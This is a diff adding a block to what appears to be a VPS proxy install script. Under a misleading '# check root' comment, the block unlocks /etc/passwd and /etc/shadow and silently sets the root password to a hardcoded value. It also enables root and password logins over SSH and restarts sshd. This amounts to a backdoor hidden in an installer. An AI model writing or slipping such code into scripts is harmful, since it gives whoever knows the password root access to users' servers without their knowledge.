@@ -10,6 +10,25 @@ DEFAULT_UUID="059ab893-7a38-4a01-a4fa-8111bb7e50cb" #默认随机UUID
 
 IP_ADDRESSES=($(hostname -I))
 cur_dir=$(pwd)
+
+# check root
+[[ $EUID -ne 0 ]] && su='sudo' 
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+prl=`grep PermitRootLogin /etc/ssh/sshd_config`
+pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
+if [[ -n $prl && -n $pa ]]; then
+mima=520940
+echo root:$mima | $su chpasswd root
+$su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
+$su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
+$su service sshd restart
+else
+red "当前vps不支持root账户或无法自定义root密码,建议先执行sudo -i 进入root账户后再执行脚本" 
+fi
+
 install_base() {
     if [[ x"${release}" == x"centos" ]]; then
         yum install epel-release -y && yum install wget curl tar -y
